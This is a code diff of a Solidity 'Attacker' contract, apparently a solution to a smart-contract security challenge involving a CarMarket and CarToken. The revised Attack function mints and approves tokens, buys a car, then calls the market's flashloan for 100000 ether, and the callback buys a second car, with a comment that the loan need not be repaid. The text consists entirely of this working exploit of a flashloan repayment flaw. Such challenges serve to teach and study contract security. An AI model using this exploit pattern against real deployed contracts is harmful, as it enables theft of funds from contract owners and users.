@@ -24,24 +24,24 @@ contract Attacker {
         carToken = ICarToken(_carToken);
         carMarket = ICarMarket(_carMarket);
     }
-
+    
     /**
     * @notice Attack
     */
-    function Attack(address _carMarketOwner) external {
+    function Attack() external {
         //mint & approve
+        carToken.approve(address(carMarket), 100001 ether);
         carToken.mint();
-        carToken.approve(_carMarketOwner, 1);
         //purchase
         carMarket.purchaseCar("black", "Rolls Royce", "Phantom Drophead");
         //flashloan
-        (bool success, ) = address(carMarket).call(abi.encodeWithSignature("flashloan(uint256)", 1));
-        //purchase
-        //payback
+        (bool success, ) = address(carMarket).call(abi.encodeWithSignature("flashloan(uint256)", 100000 ether));
+        require(success, "Flashloan gone wrong");
     }
 
-    function receivedCarToken(address _carFactory) external {
+    function receivedCarToken(address) external {
         carMarket.purchaseCar("black", "Rolls Royce", "Wraith Black Badge");
-        carToken.transfer(_carFactory, 1);
+
+        //No need to repay the flashloan
     }
 }
